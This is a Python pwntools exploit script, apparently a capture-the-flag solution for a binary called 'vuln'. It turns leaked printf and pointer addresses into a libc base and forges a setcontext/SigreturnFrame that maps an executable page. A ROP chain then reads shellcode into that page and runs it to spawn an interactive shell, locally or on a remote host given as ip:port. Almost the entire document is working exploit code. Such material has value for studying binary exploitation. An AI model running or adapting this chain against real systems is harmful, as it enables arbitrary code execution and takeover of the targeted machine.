#!/usr/bin/python3
from pwn import *
from sys import argv

e = context.binary = ELF('vuln')
libc = ELF('libc', checksec=False)
ld = ELF('ld', checksec=False)
if len(argv) > 1:
	ip, port = argv[1].split(":")
	conn = lambda: remote(ip, port)
else:
	conn = lambda: e.process()

p = conn()

p.recvuntil(b"printf: ")
printf = int(p.recvline(), 16)
log.info(f"printf: {hex(printf)}")

libc.address = printf - libc.sym.printf
log.info(f"libc: {hex(libc.address)}")

p.recvuntil(b"ptr: ")
ptr = int(p.recvline(), 16)
log.info(f"ptr: {hex(ptr)}")

def setcontext(regs, addr):
	frame = SigreturnFrame()
	for reg, val in regs.items():
		setattr(frame, reg, val)
	# needed to prevent SEGFAULT
	setattr(frame, "&fpstate", addr+0x1a8)
	fpstate = {
	0x00: p16(0x37f),	# cwd
	0x02: p16(0xffff),	# swd
	0x04: p16(0x0),		# ftw
	0x06: p16(0xffff),	# fop
	0x08: 0xffffffff,	# rip
	0x10: 0x0,			# rdp
	0x18: 0x1f80,	    # mxcsr
	# 0x1c: mxcsr_mask
	# 0x20: _st[8] (0x10 bytes each)
	# 0xa0: _xmm[16] (0x10 bytes each)
	# 0x1a0: int reserved[24]
	# 0x200: [end]
	}
	return flat({
	0x00 : bytes(frame),
#	0xf8: 0					# end of SigreturnFrame
	0x128: 0,				# uc_sigmask
	0x1a8: fpstate,			# fpstate
	})

addr = 0xdead000
addr_rop = ptr + len(setcontext({}, 0))

data = setcontext({
	# mmap(addr, 0x1000, rwx, 0x22, -1, 0)
	"rip": libc.sym.mmap,
	"rdi": addr,
	"rsi": 0x1000,
	"rdx": 7,
	"rcx": 0x22,
	"r8": -1,
	"r9": 0,
	# execute rop afterwards
	"rsp": addr_rop
}, ptr)

rop = ROP(libc)
rop.gets(addr)
rop.raw(addr)

data += rop.chain()
#gdb.attach(p)
p.sendline(data)
p.sendline(str(libc.sym.setcontext).encode())

p.sendline(asm(shellcraft.linux.sh()))

p.interactive()
